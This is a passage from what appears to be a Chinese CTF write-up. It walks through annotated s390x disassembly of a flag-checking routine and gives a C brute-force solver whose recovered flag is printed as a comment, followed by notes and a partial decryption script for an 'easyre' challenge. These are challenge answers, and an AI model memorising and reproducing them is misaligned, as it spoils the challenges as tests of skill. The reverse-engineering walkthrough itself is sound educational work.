class="number">1</span></span><br><span class="line"><span class="number">10009</span>de:<span class="number">58</span> <span class="number">10</span> b0 ac       l%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">10009e2</span>:a7 <span class="number">1</span>e <span class="number">00</span> <span class="number">1f</span>       chi%r1,<span class="number">31</span></span><br><span class="line"><span class="number">10009e6</span>:a7 c4 ff b5       jle<span class="number">0x1000950</span></span><br><span class="line"><span class="number">10009</span>ea:a7 <span class="number">18</span> <span class="number">00</span> <span class="number">01</span>       lhi%r1,<span class="number">1</span></span><br><span class="line"><span class="number">10009</span>ee:b9 <span class="number">14</span> <span class="number">00</span> <span class="number">11</span>       lgfr%r1,%r1</span><br><span class="line"><span class="number">10009f</span>2:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">21</span>       lgr%r2,%r1</span><br><span class="line"><span class="number">10009f</span>6:e3 <span class="number">40</span> b1 <span class="number">20</span> <span class="number">00</span> <span class="number">04</span> lg%r4,<span class="number">288</span>(%r11)</span><br><span class="line"><span class="number">10009f</span>c:eb bf b1 <span class="number">08</span> <span class="number">00</span> <span class="number">04</span> lmg%r11,%r15,<span class="number">264</span>(%r11)</span><br><span class="line"><span class="number">1000</span>a02:<span class="number">07</span> f4             br%r4</span><br><span class="line"><span class="number">1000</span>a04:<span class="number">07</span> <span class="number">07</span>             nopr%r7</span><br><span class="line"><span class="number">1000</span>a06:<span class="number">07</span> <span class="number">07</span>             nopr%r7</span><br><span class="line"><span class="number">1000</span>a08:b3 c1 <span class="number">00</span> <span class="number">2b</span>       ldgr%f2,%r11  <span class="comment">//加密判断函数</span></span><br><span class="line"><span class="number">1000</span>a0c:b3 c1 <span class="number">00</span> <span class="number">0f</span>       ldgr%f0,%r15</span><br><span class="line"><span class="number">1000</span>a10:e3 f0 ff <span class="number">48</span> ff <span class="number">71</span> lay%r15,<span class="number">-184</span>(%r15)</span><br><span class="line"><span class="number">1000</span>a16:b9 <span class="number">04</span> <span class="number">00</span> bf       lgr%r11,%r15</span><br><span class="line"><span class="number">1000</span>a1a:e3 <span class="number">20</span> b0 a0 <span class="number">00</span> <span class="number">24</span> stg%r2,<span class="number">160</span>(%r11)        <span class="comment">//input</span></span><br><span class="line"><span class="number">1000</span>a20:e5 <span class="number">4</span>c b0 a8 <span class="number">00</span> <span class="number">00</span> mvhi<span class="number">168</span>(%r11),<span class="number">0</span> <span class="comment">//mov 立即数</span></span><br><span class="line"><span class="number">1000</span>a26:a7 f4 <span class="number">00</span> <span class="number">4b</span>       j<span class="number">0x1000abc</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>a2a:e3 <span class="number">10</span> b0 a8 <span class="number">00</span> <span class="number">14</span> lgf%r1,<span class="number">168</span>(%r11)  <span class="comment">//循环</span></span><br><span class="line"><span class="number">1000</span>a30:e3 <span class="number">10</span> b0 a0 <span class="number">00</span> <span class="number">08</span> ag%r1,<span class="number">160</span>(%r11)<span class="comment">//r1 = input[i]</span></span><br><span class="line"><span class="number">1000</span>a36:<span class="number">43</span> <span class="number">10</span> <span class="number">10</span> <span class="number">00</span>       ic%r1,<span class="number">0</span>(%r1)</span><br><span class="line"><span class="number">1000</span>a3a:b9 <span class="number">94</span> <span class="number">00</span> <span class="number">11</span>       llcr%r1,%r1</span><br><span class="line"><span class="number">1000</span>a3e:<span class="number">50</span> <span class="number">10</span> b0 b4       st%r1,<span class="number">180</span>(%r11)<span class="comment">//r11[180] = r1</span></span><br><span class="line"><span class="number">1000</span>a42:<span class="number">58</span> <span class="number">30</span> b0 b4       l%r3,<span class="number">180</span>(%r11) <span class="comment">//r3 = r1</span></span><br><span class="line"><span class="number">1000</span>a46:<span class="number">71</span> <span class="number">30</span> b0 b4       ms%r3,<span class="number">180</span>(%r11)<span class="comment">//r3*r3</span></span><br><span class="line"><span class="number">1000</span>a4a:c0 <span class="number">10</span> <span class="number">00</span> <span class="number">04</span> d3 ef larl%r1,<span class="number">0x109b228</span><span class="comment">//</span></span><br><span class="line"><span class="number">1000</span>a50:e3 <span class="number">20</span> b0 a8 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">168</span>(%r11)   <span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>a56:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">// &lt;&lt; 2  (*4)</span></span><br><span class="line"><span class="number">1000</span>a5c:<span class="number">58</span> <span class="number">12</span> <span class="number">10</span> <span class="number">00</span>       l%r1,<span class="number">0</span>(%r2,%r1)<span class="comment">// 0x109b228[i&lt;&lt;2]</span></span><br><span class="line"><span class="number">1000</span>a60:b2 <span class="number">52</span> <span class="number">00</span> <span class="number">31</span>       msr%r3,%r1<span class="comment">//input[i]*input[i]*0x109b228[i&lt;&lt;2]</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>a64:c0 <span class="number">10</span> <span class="number">00</span> <span class="number">04</span> d3 e2 larl%r1,<span class="number">0x109b228</span></span><br><span class="line"><span class="number">1000</span>a6a:e3 <span class="number">20</span> b0 a8 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">168</span>(%r11)<span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>a70:a7 <span class="number">2b</span> <span class="number">00</span> <span class="number">20</span>       aghi%r2,<span class="number">32</span><span class="comment">//add + 32</span></span><br><span class="line"><span class="number">1000</span>a74:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">// &lt;&lt; 2</span></span><br><span class="line"><span class="number">1000</span>a7a:<span class="number">58</span> <span class="number">12</span> <span class="number">10</span> <span class="number">00</span>       l%r1,<span class="number">0</span>(%r2,%r1)<span class="comment">//0x109b228[(i+32)&lt;&lt;2]</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>a7e:<span class="number">71</span> <span class="number">10</span> b0 b4       ms%r1,<span class="number">180</span>(%r11)<span class="comment">//0x109b228[(i+32)&lt;&lt;2]*input[i]</span></span><br><span class="line"><span class="number">1000</span>a82:<span class="number">1</span>a <span class="number">31</span>             ar%r3,%r1<span class="comment">//input[i]*input[i]*0x109b228[i&lt;&lt;2] + 0x109b228[(i+32)&lt;&lt;2]*input[i]</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>a84:c0 <span class="number">10</span> <span class="number">00</span> <span class="number">04</span> d3 d2 larl%r1,<span class="number">0x109b228</span></span><br><span class="line"><span class="number">1000</span>a8a:e3 <span class="number">20</span> b0 a8 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">168</span>(%r11)<span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>a90:a7 <span class="number">2b</span> <span class="number">00</span> <span class="number">40</span>       aghi%r2,<span class="number">64</span><span class="comment">//i+64</span></span><br><span class="line"><span class="number">1000</span>a94:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">//(i+64) &lt;&lt; 2</span></span><br><span class="line"><span class="number">1000</span>a9a:<span class="number">58</span> <span class="number">12</span> <span class="number">10</span> <span class="number">00</span>       l%r1,<span class="number">0</span>(%r2,%r1)<span class="comment">//r1 = 0x109b228[(i+64) &lt;&lt; 2]</span></span><br><span class="line"><span class="number">1000</span>a9e:<span class="number">1</span>a <span class="number">31</span>             ar%r3,%r1<span class="comment">//add r3 +  0x109b228[(i+64) &lt;&lt; 2]</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>aa0:c4 <span class="number">18</span> <span class="number">00</span> <span class="number">04</span> d3 <span class="number">68</span> lgrl%r1,<span class="number">0x109b170</span></span><br><span class="line"><span class="number">1000</span>aa6:e3 <span class="number">20</span> b0 a8 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">168</span>(%r11)  <span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>aac:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">// i &lt;&lt; 2</span></span><br><span class="line"><span class="number">1000</span>ab2:<span class="number">50</span> <span class="number">32</span> <span class="number">10</span> <span class="number">00</span>       st%r3,<span class="number">0</span>(%r2,%r1)r1[r2] = r3, <span class="number">0x109dd08</span></span><br><span class="line"><span class="number">1000</span>ab6:eb <span class="number">01</span> b0 a8 <span class="number">00</span> <span class="number">6</span>a asi<span class="number">168</span>(%r11),<span class="number">1</span> <span class="comment">//i++;</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>abc:<span class="number">58</span> <span class="number">10</span> b0 a8       l%r1,<span class="number">168</span>(%r11)<span class="comment">//mov eax, i(168(%r11));</span></span><br><span class="line"><span class="number">1000</span>ac0:a7 <span class="number">1</span>e <span class="number">00</span> <span class="number">1f</span>       chi%r1,<span class="number">31</span></span><br><span class="line"><span class="number">1000</span>ac4:a7 c4 ff b3       jle<span class="number">0x1000a2a</span>   <span class="comment">//cmp </span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>ac8:e5 <span class="number">4</span>c b0 ac <span class="number">00</span> <span class="number">01</span> mvhi<span class="number">172</span>(%r11),<span class="number">1</span> <span class="comment">//j = 1</span></span><br><span class="line"><span class="number">1000</span>ace:e5 <span class="number">4</span>c b0 b0 <span class="number">00</span> <span class="number">00</span> mvhi<span class="number">176</span>(%r11),<span class="number">0</span><span class="comment">//i = 0</span></span><br><span class="line"><span class="number">1000</span>ad4:a7 f4 <span class="number">00</span> <span class="number">21</span>       j<span class="number">0x1000b16</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>ad8:c4 <span class="number">18</span> <span class="number">00</span> <span class="number">04</span> d3 <span class="number">4</span>c lgrl%r1,<span class="number">0x109b170</span>  <span class="comment">//判断循环  加密后的数据</span></span><br><span class="line"><span class="number">1000</span>ade:e3 <span class="number">20</span> b0 b0 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">176</span>(%r11)<span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>ae4:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">//i &lt;&lt; 2</span></span><br><span class="line"><span class="number">1000</span>aea:<span class="number">58</span> <span class="number">32</span> <span class="number">10</span> <span class="number">00</span>       l%r3,<span class="number">0</span>(%r2,%r1)<span class="comment">//enc[i&lt;&lt;2]</span></span><br><span class="line"><span class="number">1000</span>aee:c0 <span class="number">10</span> <span class="number">00</span> <span class="number">04</span> d3 <span class="number">5</span>d larl%r1,<span class="number">0x109b1a8</span></span><br><span class="line"><span class="number">1000</span>af4:e3 <span class="number">20</span> b0 b0 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">176</span>(%r11)<span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>afa:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">// i &lt;&lt; 2</span></span><br><span class="line"><span class="number">1000b</span>00:<span class="number">58</span> <span class="number">12</span> <span class="number">10</span> <span class="number">00</span>       l%r1,<span class="number">0</span>(%r2,%r1)<span class="comment">//d[i&lt;&lt;2]</span></span><br><span class="line"><span class="number">1000b</span>04:<span class="number">19</span> <span class="number">31</span>             cr%r3,%r1</span><br><span class="line"><span class="number">1000b</span>06:a7 <span class="number">84</span> <span class="number">00</span> <span class="number">05</span>       je<span class="number">0x1000b10</span></span><br><span class="line"><span class="number">1000b</span>0a:e5 <span class="number">4</span>c b0 ac <span class="number">00</span> <span class="number">00</span> mvhi<span class="number">172</span>(%r11),<span class="number">0</span></span><br><span class="line"><span class="number">1000b</span>10:eb <span class="number">01</span> b0 b0 <span class="number">00</span> <span class="number">6</span>a asi<span class="number">176</span>(%r11),<span class="number">1</span> <span class="comment">//add</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000b</span>16:<span class="number">58</span> <span class="number">10</span> b0 b0       l%r1,<span class="number">176</span>(%r11)<span class="comment">//i</span></span><br><span class="line"><span class="number">1000b</span>1a:a7 <span class="number">1</span>e <span class="number">00</span> <span class="number">1f</span>       chi%r1,<span class="number">31</span><span class="comment">//cmp</span></span><br><span class="line"><span class="number">1000b</span>1e:a7 c4 ff dd       jle<span class="number">0x1000ad8</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000b</span>22:<span class="number">58</span> <span class="number">10</span> b0 ac       l%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">1000b</span>26:b9 <span class="number">14</span> <span class="number">00</span> <span class="number">11</span>       lgfr%r1,%r1</span><br><span class="line"><span class="number">1000b</span>2a:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">21</span>       lgr%r2,%r1</span><br><span class="line"><span class="number">1000b</span>2e:b3 cd <span class="number">00</span> b2       lgdr%r11,%f2</span><br><span class="line"><span class="number">1000b</span>32:b3 cd <span class="number">00</span> f0       lgdr%r15,%f0</span><br><span class="line"><span class="number">1000b</span>36:<span class="number">07</span> fe             br%r14</span><br><span class="line"></span><br><span class="line"><span class="number">1000b</span>38:eb bf f0 <span class="number">58</span> <span class="number">00</span> <span class="number">24</span> stmg%r11,%r15,<span class="number">88</span>(%r15)   <span class="comment">//main函数</span></span><br><span class="line"><span class="number">1000b</span>3e:e3 f0 ff <span class="number">20</span> ff <span class="number">71</span> lay%r15,<span class="number">-224</span>(%r15)</span><br><span class="line"><span class="number">1000b</span>44:b9 <span class="number">04</span> <span class="number">00</span> bf       lgr%r11,%r15</span><br><span class="line"><span class="number">1000b</span>48:b2 <span class="number">4f</span> <span class="number">00</span> <span class="number">10</span>       ear%r1,%a0</span><br><span class="line"><span class="number">1000b</span>4c:eb <span class="number">11</span> <span class="number">00</span> <span class="number">20</span> <span class="number">00</span> <span class="number">0</span>d sllg%r1,%r1,<span class="number">32</span></span><br><span class="line"><span class="number">1000b</span>52:b2 <span class="number">4f</span> <span class="number">00</span> <span class="number">11</span>       ear%r1,%a1</span><br><span class="line"><span class="number">1000b</span>56:d2 <span class="number">07</span> b0 d8 <span class="number">10</span> <span class="number">28</span> mvc<span class="number">216</span>(<span class="number">8</span>,%r11),<span class="number">40</span>(%r1)</span><br><span class="line"><span class="number">1000b</span>5c:c0 <span class="number">20</span> <span class="number">00</span> <span class="number">03</span> <span class="number">82</span> <span class="number">84</span> larl%r2,<span class="number">0x1071064</span> <span class="comment">//please input ...</span></span><br><span class="line"><span class="number">1000b</span>62:c0 e5 <span class="number">00</span> <span class="number">00</span> <span class="number">40</span> <span class="number">43</span> brasl%r14,<span class="number">0x1008be8</span><span class="comment">//printf</span></span><br><span class="line"><span class="number">1000b</span>68:ec <span class="number">1b</span> <span class="number">00</span> a6 <span class="number">00</span> d9 aghik%r1,%r11,<span class="number">166</span></span><br><span class="line"><span class="number">1000b</span>6e:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">31</span>       lgr%r3,%r1</span><br><span class="line"><span class="number">1000b</span>72:c0 <span class="number">20</span> <span class="number">00</span> <span class="number">03</span> <span class="number">82</span> <span class="number">87</span> larl%r2,<span class="number">0x1071080</span>      <span class="comment">// %s</span></span><br><span class="line"><span class="number">1000b</span>78:c0 e5 <span class="number">00</span> <span class="number">00</span> <span class="number">3</span>a <span class="number">5</span>c brasl%r14,<span class="number">0x1008030</span> <span class="comment">// scanf(" ");</span></span><br><span class="line"><span class="number">1000b</span>7e:ec <span class="number">1b</span> <span class="number">00</span> a6 <span class="number">00</span> d9 aghik%r1,%r11,<span class="number">166</span> <span class="comment">//add  </span></span><br><span class="line"><span class="number">1000b</span>84:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">21</span>       lgr%r2,%r1%r1 : input</span><br><span class="line"><span class="number">1000b</span>88:c0 e5 ff ff fe c4 brasl%r14,<span class="number">0x1000910</span><span class="comment">//关键加密函数。</span></span><br><span class="line"><span class="number">1000b</span>8e:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">12</span>       lgr%r1,%r2<span class="comment">//mov</span></span><br><span class="line"><span class="number">1000b</span>92:<span class="number">12</span> <span class="number">11</span>             ltr%r1,%r1 <span class="comment">//cmp  test</span></span><br><span class="line"><span class="number">1000b</span>94:a7 <span class="number">84</span> <span class="number">00</span> <span class="number">17</span>       je<span class="number">0x1000bc2</span></span><br><span class="line"><span class="number">1000b</span>98:ec <span class="number">1b</span> <span class="number">00</span> a6 <span class="number">00</span> d9 aghik%r1,%r11,<span class="number">166</span></span><br><span class="line"><span class="number">1000b</span>9e:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">21</span>       lgr%r2,%r1</span><br><span class="line"><span class="number">1000b</span>a2:c0 e5 ff ff ff <span class="number">33</span> brasl%r14,<span class="number">0x1000a08</span></span><br><span class="line"><span class="number">1000b</span>a8:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">12</span>       lgr%r1,%r2</span><br><span class="line"><span class="number">1000b</span>ac:<span class="number">12</span> <span class="number">11</span>             ltr%r1,%r1</span><br><span class="line"><span class="number">1000b</span>ae:a7 <span class="number">84</span> <span class="number">00</span> <span class="number">0</span>a       je<span class="number">0x1000bc2</span></span><br><span class="line"><span class="number">1000b</span>b2:c0 <span class="number">20</span> <span class="number">00</span> <span class="number">03</span> <span class="number">82</span> <span class="number">69</span> larl%r2,<span class="number">0x1071084</span> <span class="comment">// lea "you win"</span></span><br><span class="line"><span class="number">1000b</span>b8:c0 e5 <span class="number">00</span> <span class="number">00</span> <span class="number">40</span> <span class="number">18</span> brasl%r14,<span class="number">0x1008be8</span></span><br><span class="line"><span class="number">1000b</span>be:a7 f4 <span class="number">00</span> <span class="number">08</span>       j<span class="number">0x1000bce</span></span><br><span class="line"><span class="number">1000b</span>c2:c0 <span class="number">20</span> <span class="number">00</span> <span class="number">03</span> <span class="number">82</span> <span class="number">66</span> larl%r2,<span class="number">0x107108e</span>   <span class="comment">//lea "you lose!"</span></span><br><span class="line"><span class="number">1000b</span>c8:c0 e5 <span class="number">00</span> <span class="number">00</span> <span class="number">40</span> <span class="number">10</span> brasl%r14,<span class="number">0x1008be8</span></span><br></pre></td></tr></table></figure><p>提取处数据，在gdb中使用x/100xw查看的数据然后提取出（直接找到地址让hex.txt文件找也可以）。</p><p>然后解密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> data[] = &#123; <span class="number">0x0000b2b0</span>, <span class="number">0x00006e72</span>, <span class="number">0x00006061</span>, <span class="number">0x0000565d</span>,</span><br><span class="line"><span class="number">0x0000942d</span>, <span class="number">0x0000ac79</span>, <span class="number">0x0000391c</span>, <span class="number">0x0000643d</span>,</span><br><span class="line"><span class="number">0x0000ec3f</span>, <span class="number">0x0000bd10</span>, <span class="number">0x0000c43e</span>, <span class="number">0x00007a65</span>,</span><br><span class="line"><span class="number">0x0000184b</span>, <span class="number">0x0000ef5b</span>, <span class="number">0x00005a06</span>, <span class="number">0x0000a8c0</span>,</span><br><span class="line"><span class="number">0x0000f64b</span>, <span class="number">0x0000c774</span>, <span class="number">0x000002ff</span>, <span class="number">0x00008e57</span>,</span><br><span class="line"><span class="number">0x0000aed9</span>, <span class="number">0x0000d8a9</span>, <span class="number">0x0000230c</span>, <span class="number">0x000074e8</span>,</span><br><span class="line"><span class="number">0x0000c2a6</span>, <span class="number">0x000088b3</span>, <span class="number">0x0000af2a</span>, <span class="number">0x00009ea7</span>,</span><br><span class="line"><span class="number">0x0000ce8a</span>, <span class="number">0x00005924</span>, <span class="number">0x0000d276</span>, <span class="number">0x000056d4</span>,</span><br><span class="line"><span class="number">0x000077d7</span>, <span class="number">0x0000990e</span>, <span class="number">0x0000b585</span>, <span class="number">0x00004bcd</span>,</span><br><span class="line"><span class="number">0x00005277</span>, <span class="number">0x00001afc</span>, <span class="number">0x00008c8a</span>, <span class="number">0x0000cdb5</span>,</span><br><span class="line"><span class="number">0x00006e26</span>, <span class="number">0x00004c22</span>, <span class="number">0x0000673f</span>, <span class="number">0x0000daff</span>,</span><br><span class="line"><span class="number">0x00000fac</span>, <span class="number">0x000086c7</span>, <span class="number">0x0000e048</span>, <span class="number">0x0000c483</span>,</span><br><span class="line"><span class="number">0x000085d3</span>, <span class="number">0x00002204</span>, <span class="number">0x0000c2ee</span>, <span class="number">0x0000e07f</span>,</span><br><span class="line"><span class="number">0x00000caf</span>, <span class="number">0x0000bf76</span>, <span class="number">0x000063fe</span>, <span class="number">0x0000bffb</span>,</span><br><span class="line"><span class="number">0x00004b09</span>, <span class="number">0x0000e5b3</span>, <span class="number">0x00008bda</span>, <span class="number">0x000096df</span>,</span><br><span class="line"><span class="number">0x0000866d</span>, <span class="number">0x00001719</span>, <span class="number">0x00006bcf</span>, <span class="number">0x0000adcc</span>,</span><br><span class="line"><span class="number">0x00000f2b</span>, <span class="number">0x000051ce</span>, <span class="number">0x00001549</span>, <span class="number">0x000020c1</span>,</span><br><span class="line"><span class="number">0x00003a8d</span>, <span class="number">0x000005f5</span>, <span class="number">0x00005403</span>, <span class="number">0x00001125</span>,</span><br><span class="line"><span class="number">0x00009161</span>, <span class="number">0x0000e2a5</span>, <span class="number">0x00005196</span>, <span class="number">0x0000d8d2</span>,</span><br><span class="line"><span class="number">0x0000d644</span>, <span class="number">0x0000ee86</span>, <span class="number">0x00003896</span>, <span class="number">0x00002e71</span>,</span><br><span class="line"><span class="number">0x0000a6f1</span>, <span class="number">0x0000dfcf</span>, <span class="number">0x00003ece</span>, <span class="number">0x00007d49</span>,</span><br><span class="line"><span class="number">0x0000c24d</span>, <span class="number">0x0000237e</span>, <span class="number">0x00009352</span>, <span class="number">0x00007a97</span>,</span><br><span class="line"><span class="number">0x00007bfa</span>, <span class="number">0x0000cbaa</span>, <span class="number">0x000010dc</span>, <span class="number">0x00003bd9</span>,</span><br><span class="line"><span class="number">0x00007d7b</span>, <span class="number">0x00003b88</span>, <span class="number">0x0000b0d0</span>, <span class="number">0x0000e8bc</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> result[] = &#123; <span class="number">0x08a73233</span>, <span class="number">0x116db0f6</span>, <span class="number">0x0e654937</span>, <span class="number">0x03c374a7</span>,</span><br><span class="line"><span class="number">0x16bc8ed9</span>, <span class="number">0x0846b755</span>, <span class="number">0x08949f47</span>, <span class="number">0x04a13c27</span>,</span><br><span class="line"><span class="number">0x0976cf0a</span>, <span class="number">0x07461189</span>, <span class="number">0x1e1a5c12</span>, <span class="number">0x11e64d96</span>,</span><br><span class="line"><span class="number">0x03cf09b3</span>, <span class="number">0x093cb610</span>, <span class="number">0x0d41ea64</span>, <span class="number">0x07648050</span>,</span><br><span class="line"><span class="number">0x092039bf</span>, <span class="number">0x08e7f1f7</span>, <span class="number">0x004d871f</span>, <span class="number">0x1680f823</span>,</span><br><span class="line"><span class="number">0x06f3c3eb</span>, <span class="number">0x2205134d</span>, <span class="number">0x015c6a7c</span>, <span class="number">0x11c67ed0</span>,</span><br><span class="line"><span class="number">0x0817b32e</span>, <span class="number">0x06bd9b92</span>, <span class="number">0x08806b0c</span>, <span class="number">0x06aaa515</span>,</span><br><span class="line"><span class="number">0x205b9f76</span>, <span class="number">0x0de963e9</span>, <span class="number">0x2194e8e2</span>, <span class="number">0x047593bc</span> &#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> input = <span class="number">0x20</span>; input &lt; <span class="number">0x7e</span>; input++)</span><br><span class="line">&#123;</span><br><span class="line">a = input*input*data[i]+ data[i + <span class="number">32</span>] * input+ data[i + <span class="number">64</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (a == result[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, input);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//8eb5d8b632dae2a5167e3e1c4884eef9</span></span><br></pre></td></tr></table></figure><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><p>直接拖入ida分析完main函数后没有发现加密判断函数，直接动调跟流程，也很简单，整理了下加密与最后比较数据的笔记：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a = input[<span class="number">0</span>] &lt;&lt; <span class="number">3</span></span><br><span class="line">b = input[<span class="number">1</span>] &gt;&gt; <span class="number">5</span></span><br><span class="line">a = a|b</span><br><span class="line">a = a ^ i;</span><br><span class="line"></span><br><span class="line">input[i] = (input[i] &lt;&lt; <span class="number">3</span>) | (input[(i+<span class="number">1</span>)%<span class="number">24</span>] &amp; <span class="number">0xE0</span>) &gt;&gt; <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">43</span>,   <span class="number">8</span>, <span class="number">169</span>, <span class="number">200</span>, <span class="number">151</span>,  <span class="number">47</span>, <span class="number">255</span>, <span class="number">140</span>, <span class="number">146</span>, <span class="number">240</span>, </span><br><span class="line">  <span class="number">163</span>, <span class="number">137</span>, <span class="number">247</span>,  <span class="number">38</span>,   <span class="number">7</span>, <span class="number">164</span>, <span class="number">218</span>, <span class="number">234</span>, <span class="number">179</span>, <span class="number">145</span>, </span><br><span class="line">  <span class="number">239</span>, <span class="number">220</span>, <span class="number">149</span>, <span class="number">171</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">sar:算术右移指令。右移时保留操作数的符号，即用符号位来补足。</span><br><span class="line">shr:逻辑右移指令。右移时总是用<span class="number">0</span>来补足。</span><br></pre></td></tr></table></figure><p>解密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">43</span>,   <span class="number">8</span>, <span class="number">169</span>, <span class="number">200</span>, <span class="number">151</span>,  <span class="number">47</span>, <span class="number">255</span>, <span class="number">140</span>, <span class="number">146</span>, <span class="number">240</span>, </span><br><span class="line">  <span class="number">163</span>, <span class="number">137</span>, <span class="number">247</span>,  <span class="number">38</span>,   <span class="number">7</span>, <span class="number">164</span>, <span class="number">218</span>, <span class="number">234</span>, <span class="number">179</span>, <span class="number">145</span>, </span><br><span class="line">  <span class="number">239</span>, <span class="number">220</span>, <span class="number">149</span>, <span class="number">171</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span 